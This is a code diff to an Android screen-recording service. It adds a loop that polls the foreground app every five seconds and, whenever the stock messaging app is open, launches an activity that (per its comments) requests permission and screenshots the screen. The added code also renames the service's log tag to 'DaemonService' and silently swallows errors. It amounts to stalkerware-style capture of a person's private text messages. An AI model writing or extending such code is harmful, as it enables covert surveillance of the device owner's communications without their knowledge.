@@ -1,6 +1,9 @@
 package screen.com.myapplication;
 
 import android.app.Service;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
+import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
@@ -10,6 +13,7 @@ import android.media.Image;
 import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.os.Binder;
+import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.HandlerThread;
@@ -23,6 +27,9 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
+import java.util.List;
+
+import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
 public class RecordService extends Service {
 
@@ -36,7 +43,9 @@ public class RecordService extends Service {
     private int height = 1080;
     private int dpi;
 
-    final String TAG = "test";
+    final String TAG = "DaemonService";
+
+    private String  currentAppName = "";
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -45,6 +54,7 @@ public class RecordService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG,"onStartCommand");
         return START_STICKY;
     }
 
@@ -53,6 +63,7 @@ public class RecordService extends Service {
         super.onCreate();
         HandlerThread serviceThread = new HandlerThread("service_thread", Process.THREAD_PRIORITY_BACKGROUND);
         serviceThread.start();
+        autoTakePhoto();
         running = false;
     }
 
@@ -83,7 +94,7 @@ public class RecordService extends Service {
                 try{
                     initRecorder(mImageReader);
                 }catch (IllegalStateException argE){
-                }
+                }catch (NullPointerException argE){}
                 stopRecord();
             }
         },new Handler());
@@ -174,6 +185,59 @@ public class RecordService extends Service {
     public class RecordBinder extends Binder {
         public RecordService getRecordService() {
             return RecordService.this;
+        }
+    }
+
+    public void autoTakePhoto(){
+
+
+        final Handler localHandler = new Handler();
+        Runnable localRunnable = new Runnable() {
+            @Override
+            public void run() {
+
+                //Log.d(TAG,"定时函数");
+
+                // 获取topApp包名
+                getTopApp(RecordService.this);
+
+                // 定时x秒，调用Activity，当Activity被激活的时候，自动开始申请权限，并截图
+                if(currentAppName.contains("com.android.messaging")){
+                    Intent localIntent = new Intent();
+                    localIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
+                    localIntent.setClass(RecordService.this,MainActivity.class);
+                    startActivity(localIntent);
+                }
+
+                // 延迟x秒，重复执行run函数
+                localHandler.postDelayed(this,5000);
+            }
+        };
+
+        localHandler.post(localRunnable);
+
+    }
+
+    private void getTopApp(Context context) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            UsageStatsManager m = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
+            if (m != null) {
+                long now = System.currentTimeMillis();
+                //获取60秒之内的应用数据
+                List<UsageStats> stats = m.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 60 * 1000, now);
+
+                //取得最近运行的一个app，即当前运行的app
+                if ((stats != null) && (!stats.isEmpty())) {
+                    int j = 0;
+                    for (int i = 0; i < stats.size(); i++) {
+                        if (stats.get(i).getLastTimeUsed() > stats.get(j).getLastTimeUsed()) {
+                            j = i;
+                        }
+                    }
+                    currentAppName = stats.get(j).getPackageName();
+                }
+                Log.d(TAG, "top running app is : "+currentAppName);
+            }
         }
     }
 }
